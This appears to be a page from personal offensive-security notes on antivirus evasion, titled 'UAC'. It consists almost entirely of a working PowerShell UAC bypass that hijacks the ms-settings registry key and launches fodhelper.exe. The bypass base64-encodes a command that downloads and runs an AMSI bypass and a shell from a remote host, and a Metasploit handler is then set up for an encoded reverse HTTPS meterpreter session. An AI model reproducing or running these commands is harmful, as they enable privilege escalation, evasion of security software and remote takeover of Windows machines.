---
title: UAC
layout: default
parent: Antivirus Evasion
nav_order: 3
---

Please note that this only works in Powershell (not from Word Macro)

Use the following as a powershell script(shell2 is AMSI bypass, shell3 is the shell):

```
$cm = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/shell2.txt') | iex;(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/shell3.txt') | iex;Start-Sleep -Seconds 99999;"
$cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cm)) 
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -EncodedCommand $cmd" -Force 
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

Prepare for shell (different, take note!)
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```